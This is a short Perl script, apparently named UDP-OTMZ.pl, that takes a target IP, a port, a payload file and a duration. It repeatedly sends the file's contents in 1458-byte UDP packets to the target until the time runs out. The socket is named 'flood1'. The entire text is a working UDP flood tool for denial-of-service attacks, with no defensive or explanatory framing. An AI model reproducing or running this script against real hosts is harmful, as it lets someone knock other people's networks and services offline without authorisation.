use Socket;
use strict;
use IO::Socket;

if ($#ARGV != 3) {
  print " \n";

  
print "
Args => perl UDP-OTMZ.pl <IP> <PORT> <FILE> <TIME>
";
exit(1);
}
 my ($ip,$port,$file,$time) = @ARGV;
 
my ($iaddr,$endtime);
 
$iaddr = inet_aton("$ip") or die "Error\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood1, PF_INET, SOCK_DGRAM, 17);

  my $sock = new IO::Socket::INET(
     PeerAddr => $ip,
     PeerPort => $port,
     Proto    => 'udp');
 
for (;time() <= $endtime;) {

 open (FILE,$file) ; binmode(FILE) ;
  my $buffer ;
 while( sysread(FILE, $buffer , 1458) ) {
    print $sock $buffer ;
	
	
  }
  
  

  } 
